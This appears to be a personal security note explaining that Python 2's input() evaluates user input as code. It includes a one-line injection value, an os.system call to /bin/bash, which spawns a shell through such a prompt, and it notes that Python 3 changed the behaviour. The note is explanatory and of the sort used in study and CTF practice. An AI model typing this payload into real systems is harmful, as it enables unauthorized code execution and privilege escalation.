---
note_tags:
  - python
  - rce
  - privesc
  - python2
---
# python2-input-rce

**Author:** Julien Bongars\
**Date:** 2026-02-19 03:14:50
**Path:**

---

In Python 2, `input()` evaluates user input as code. It's essentially `eval(raw_input())`.

If a script does something like:

```python
name = input("Enter your name: ")
```

You can get a shell:

```txt
Enter your name: __import__("os").system("/bin/bash")
```

Python 3 fixed this—`input()` behaves like Python 2's `raw_input()` and returns a string.

## Resources

- [Python 2 input()](https://docs.python.org/2.7/library/functions.html#input) — eval-on-input behaviour
